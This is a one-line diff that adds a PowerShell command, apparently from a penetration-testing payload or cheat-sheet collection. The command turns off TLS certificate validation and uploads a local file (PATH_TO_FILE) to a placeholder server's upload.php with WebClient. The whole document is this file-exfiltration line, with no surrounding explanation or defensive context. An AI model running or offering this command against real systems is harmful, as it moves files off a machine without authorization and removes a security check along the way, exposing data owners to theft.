@@ -1,0 +1,1 @@
+powershell.exe -noprofile -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $http = new-object System.Net.WebClient; $response = $http.UploadFile("""http://SERVER/upload.php""","""PATH_TO_FILE""");"
